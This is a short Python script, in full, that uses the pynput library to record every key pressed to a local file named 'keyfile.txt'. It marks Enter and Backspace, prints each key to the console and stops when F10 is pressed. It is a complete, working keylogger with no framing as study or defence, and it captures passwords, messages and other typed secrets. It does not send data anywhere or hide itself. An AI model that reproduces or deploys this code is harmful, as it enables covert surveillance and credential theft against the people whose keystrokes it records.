from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            # Handle special keys
            if key == keyboard.Key.enter:
                logKey.write("<Enter>")
            elif key == keyboard.Key.backspace:
                logKey.write("<Backspace>")
            else:
                logKey.write("<Unhandled Special Key>")

def on_release(key):
    # Stop the listener on pressing 'F10'
    if key == keyboard.Key.f10:
        return False

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed, on_release=on_release)
    listener.start()
    listener.join()
